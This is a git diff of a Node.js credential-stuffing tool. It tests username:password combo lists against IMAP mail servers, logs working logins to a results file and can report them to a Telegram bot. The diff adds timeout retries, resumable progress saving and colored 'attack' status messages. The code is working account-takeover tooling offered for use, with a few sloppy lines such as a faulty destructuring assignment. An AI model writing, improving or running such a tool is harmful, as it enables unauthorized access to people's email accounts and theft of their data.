@@ -2,6 +2,7 @@ process.env["NTBA_FIX_319"] = 1; // telegram bot warning fix
 
 // dependencies
 
+const color = require('colors');
 var hashFile = require('sha256-file');
 const sleep = require('sleep');
 const imaps = require('imap-simple');
@@ -9,33 +10,27 @@ const fs = require('fs');
 const cliProgress = require('cli-progress');
 const TelegramBot = require('node-telegram-bot-api');
 var configs = require('./imaps.json');
-const progressBar = new cliProgress.SingleBar({ forceRedraw: true }, cliProgress.Presets.shades_classic);
 const inquirer = require('inquirer');
+
+// const
+
 const RESULT_FILE = "results.txt";
 const SAVE_FILE = "save.json";
-// global vars
-var filePath;
-var resumeSave = false;
-var unreachbleHost = false;
-var selection;
-var host;
-var port;
-var tls;
-var index = 0;
-var max = 0;
-var counter = 0;
-var found = 0;
-var id;
+
+// var
+
+const progressBar = new cliProgress.SingleBar({ forceRedraw: true }, cliProgress.Presets.shades_classic);
+
+var selection, filePath, host, port, tls, id;
+var { max, counter, found, line, toCount, lastLine } = 0;
+var { resumeSave, unreachbleHost, botEnabled } = false;
 var log = 'Nothing!';
-var botEnabled = false;
 
 function createFile(filename) {
     fs.open(filename, 'r', function (err, fd) {
         if (err) {
             fs.writeFile(filename, '', function (err) {
-                if (err) {
-                    console.log(err);
-                }
+                if (err) console.log(err);
             });
         }
     });
@@ -52,6 +47,7 @@ setupBot = () => {
         bot.stopPolling();
         process.exit(404);
     });
+
     bot.onText(/\/status/, (msg, match) => {
         // 'msg' is the received Message from Telegram
         // 'match' is the result of executing the regexp above on the text content
@@ -92,6 +88,20 @@ clear = () => {
     process.stdout.write('\033c')
 };
 
+timedOut = async () => {
+    console.log('\n[*] Authentification TIMED OUT, retrying...');
+    line = lastLine;
+    toCount++;
+    counter--;
+    progressBar.increment(-1);
+    if (toCount >= 10) {
+        console.log(('[*] Timed out too many times aborting attack!').red);
+        console.log(('[*] Current progress is ' + counter + ' / ' + max).red);
+        console.log(('[*] Found ' + found + ' working combo...').red);
+        process.exit(42);
+    }
+}
+
 connect = async (username, password) => {
     var config = {
         imap: {
@@ -104,19 +114,20 @@ connect = async (username, password) => {
         }
     };
 
-    progressBar.increment(1);
+    // MAKING A SAVE IN CASE OF A TIMEOUT
+    lastLine = line;
     counter++;
+    progressBar.increment();
 
     await imaps.connect(config)
-        .then(function (connection) {
+        .then(connection => {
             found++;
             process.stdout.write(('[*] ' + username + ':' + password + '\r\n').green)
             writeResult(('[*] ' + username + ':' + password + '\r\n').green);
-            if (botEnabled)
-                bot.sendMessage(id, successMsg);
+            if (botEnabled) bot.sendMessage(id, successMsg);
         }).catch(error => {
-            if (error.errno === -3008)
-                unreachbleHost = true;
+            if (error.errno === -3008) unreachbleHost = true;
+            if (error.source === 'timeout') timedOut();
             log = error.toString();
         });
 }
@@ -180,8 +191,13 @@ readSave = () => {
 }
 
 main = async (path) => {
+
+    // READING SAVE FILE
+
     const saveData = readSave();
-    var line = 0;
+
+    // CHECKING SAVE
+
     saveData.forEach(element => {
         if (JSON.stringify(element.host) === JSON.stringify(selection) && element.hash === hashFile(path)) {
             line = element.index;
@@ -189,24 +205,27 @@ main = async (path) => {
             max = element.max;
             counter = element.counter;
             resumeSave = true;
-            console.log('Save has been found!\nStarting back the attack from ' +new Date(element.timestamp).toLocaleString());
+            console.log(('[*] Save has been found!\n[*] Starting back the attack from ' + new Date(element.timestamp).toLocaleString()).green);
             sleep.msleep(5000);
         }
     });
 
     filePath = path;
     var array = fs.readFileSync(path).toString().split("\r\n");
-    if (!resumeSave) {
+
+    // INITIALIZING LOOP
+
+    if (!resumeSave)
         for (line in array)
             for (let i = 0; i < selection.length; i++)
                 for (id in configs[selection[i]].tag)
                     if (array[line].includes(configs[selection[i]].tag[id]))
                         max++;
-    }
-    clear();
+    clear(); // CLEAR CLS
     progressBar.start(max, counter);
+
+    // MAIN LOOP
     for (line in array) {
-        index++;
         parser(array[line], selection);
         if (port !== -1)
             await connect(array[line].slice(0, array[line].indexOf(':')), array[line].slice(array[line].indexOf(':') + 1, array[line].length));
@@ -323,10 +342,14 @@ onCleanup = () => {
     var saveData = readSave();
     var clean = []
 
+    line = lastLine;
+    toCount++;
+    counter--;
+
     const session = {
         "timestamp": + new Date(),
         "hash": hashFile(filePath),
-        "index": index,
+        "index": line,
         "counter": counter,
         "max": max,
         "found": found,
@@ -344,7 +367,7 @@ onCleanup = () => {
     clean.push(session)
     fs.writeFileSync(SAVE_FILE, JSON.stringify(clean, null, 2))
 }
-
+''
 function exitHandler(options, exitCode) {
     if (options.cleanup) onCleanup();
     if (options.exit) process.exit();
